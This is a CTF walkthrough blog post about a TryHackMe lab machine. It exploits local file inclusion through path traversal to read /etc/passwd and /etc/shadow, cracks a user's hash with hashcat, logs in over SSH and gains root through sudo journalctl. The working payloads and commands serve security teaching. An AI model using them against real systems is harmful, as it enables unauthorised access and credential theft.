---
title: Local File Inclusion (LFI) Vulnerability
author: Dimitrios Tsarouchas
date: 2021-02-01 20:55:00 +0800
categories: [CTFs, TryHackMe]
tags: [ctf, tryhackme, linux]
pin: true
featured-image: /assets/img/local-file-inclusion-vulnerability.jpg
featured-image-alt: LFI
---

![Local File Inclusion](/assets/img/local-file-inclusion-vulnerability.jpg)*Image from netsparker.com*

## Introduction
We are going to exploit a Linux machine that is vulnerable to Local File Inclusion attack. This will be done by using the [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal){:target="_blank"} technique. We will get access to a local user account by cracking its password hash and then elevate our privileges, get access as superuser and find the flag.

## What is Local File Inclusion?

LFI or Local File Inclusion is a vulnerability that exploits improper input sanitisation in web applications and can lead to information disclosure, Cross-site Scripting (XSS), and remote code execution.

## Getting user access via LFI

To test a web application for LFI vulnerability we need any input field or a parameter and value combination in the URL for example `example.com/file=robots.txt`. 

With that in mind, an intruder could use LFI to access the target system and read files that which may contain sensitive information like SSH keys or passwords. Having this information in their hands intruders can then use this data to further compromise the system.

### Using the parameter found in the URL

Looking around the website and focusing on the URL bar we can see the parameter **page** with its value set to **contact.html** page. Let's check if the website is vulnerable to LFI by exploiting the `page` parameter we just found. 

First thing we can try is to get access to the `/etc/passwds` to check what users lives in that system. We will use the Path Traversal method which will give us access to files and directories that are stored in the system. 

We can include files like `../../etc/passwd` to go out twice from the current working directory and go read the `passwd` file that is inside the `/etc` directory. 

We will use from [PayloadsAllTheThings](https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks){:target="_blank"} the basic LFI `http://example.com/index.php?page=../../etc/passwd` and our URL should look like this `/home?page=../../etc/passwd`.

If we pay close attention at the very bottom of the web page, under the footer section, we managed to print all the users that exist in the system as well as proving that the system is vulnerable to Local File Inclusion. 

We can find valuable information about `/etc/passwd` at [nixCraft](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/){:target="_blank"} website. 

### Find a user in /etc/passwd

Looking better at `/etc/passwd` at the very bottom we can see that the user **Falcon** exists on the system.  

![Falcon user](/assets/img/LFI/etcpasswdFalcon.png) *Falcon user found in /etc/passwd file*

### Find Flacon's password hash

 Now that we have the user the only thing left is to find his password and get access to the system. In order to obtain Falcon's password we need to print the shadow file which contains the users hashes. From there we can grab Falcon's password hash and try crack it using Hashcat. 
 
 The only thing we have to do is to modify our value in the page parameter to look for the shadow file like  `/home?page=../../etc/shadow`. 

 ![Falcon's password hash](/assets/img/LFI/etcshadowFalcon.png) *Falcon's password hash found in /etc/shadow file*

We successfully found Falcon's hash starting with `$6$` indicating that uses **SHA512** algorithm. We will use Hashcat with hash mode of 1800 (sha512crypt $6$, SHA512) providing the FalconHash.txt text file which contains Falcon's hash against the rockyou.txt wordlist. 

### Cracking Falcon's password hash

``` terminal 
# hashcat -a 0 -m 1800 FalconHash.txt /usr/share/wordlists/rockyou.txt                                                                               
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$6$xQmTDVmT$hgSLG3ebs.8Tc/F4qqXNnvBBnG736EWpWKaprFVARjAsZ6JyoL4WaJdGv5.qddMWF4/MoJgN6Hekri8wyJ97k/:password09
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
``` 

Hashcat carcked successfully Falcon's password hash and revealed that Falcon uses the password: **password09**

The only thing that is left is to SSH into the target machine providing Falcon's credentials and find the user flag.

```terminal
# ssh falcon@10.10.215.76                                                  
falcon@walk:~$ ls -l
total 4
-rw-r--r-- 1 falcon falcon 21 Jan 29  2020 user.txt
falcon@walk:~$ cat user.txt
```

## Escalating our privileges to gain root access

Now that we have access to Falcon's account we will try to escalate our privileges to gain root access on the machine. In order to gain root access we need to find a vector such as a binary that could be exploited. 

You can find more information about Linux Privilege Escalation on [mzrf's blog](https://blog.mzfr.me/posts/2020-02-1-linux-priv-esc/){:target="_blank"}. 

Using the `sudo -l` command we can see what commands can Falcon run on the system as root user.
 

```terminal
falcon@walk:~$ sudo -l
Matching Defaults entries for falcon on walk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl

```

Falcon is able to run the `/bin/journalctl` command as superuser and now we need to find a way to use that binary for elevating our privileges. 

Searching in [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/){:target="_blank"} website we found that privilege escalation can be achieved by using the sudo program. 

![Journalctl](/assets/img/LFI/journalctl.png) *GTFObins - journalctl*

After executing `sudo journalctl` we want to gain shell access as root user and we do that by using  the `!/bin/bash`.  

```terminal
falcon@walk:~$ sudo journalctl 
Jan 28 19:00:21 walk kernel: Linux version 4.15.0-20-generic (buildd@lgw01-amd64-039) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 (Ubuntu 4.15.
Jan 28 19:00:21 walk kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generic root=UUID=979754d8-4db7-4b66-a804-28a498c1cc0f ro
!/bin/bash

root@walk:~# id
uid=0(root) gid=0(root) groups=0(root)
root@walk:~# pwd
/home/falcon
```

Now we need to move to the /root directory and print the root's flag.

```terminal
root@walk:/# cd root
root@walk:/root# ls
root.txt
root@walk:/root# cat root.txt 
```